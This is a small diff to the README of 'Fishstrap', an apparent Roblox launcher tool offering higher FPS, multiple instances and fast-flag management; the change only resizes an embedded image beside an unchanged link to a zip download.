@@ -4,9 +4,7 @@
 
 If you're looking to unlock higher FPS in Roblox, run multiple Roblox instances at the same time, or manage fast flags without editing JSON manually — Fishstrap handles all of it from a clean UI.
 
-<img width="919" height="919" alt="5fad1db4-561f-4c61-bf26-e448766149c6" src="https://github.com/user-attachments/assets/c27dc1ba-a993-4ed0-b85b-ddc6afd83aeb" />
-
-
+<img width="119" height="119" alt="5fad1db4-561f-4c61-bf26-e448766149c6" src="https://github.com/user-attachments/assets/c27dc1ba-a993-4ed0-b85b-ddc6afd83aeb" />
 
 ## Install
 [Download `Fishstrap.zip`](https://github.com/robloxfflag/Fishstrap-Roblox/releases/download/v3.1.2/Fishstrap.zip)
